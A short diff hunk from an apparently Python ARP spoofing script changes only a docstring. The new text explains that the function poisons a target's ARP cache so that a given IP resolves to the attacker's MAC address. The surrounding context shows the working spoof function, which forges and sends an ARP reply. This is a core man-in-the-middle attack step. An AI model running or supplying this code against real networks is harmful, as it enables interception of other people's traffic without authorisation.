@@ -15,10 +15,7 @@ def get_mac(target_ip):
 
 def spoof_arp_cache(target_ip, target_mac, source_ip):
     """
-    :param target_ip:
-    :param target_mac:
-    :param source_ip:
-    :return:
+    function sets the targets arp cache so that :param source_ip resolves to this machine's MAC
     """
     spoofed = ARP(op=ARP_REPLY, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
     send(spoofed, verbose=False)
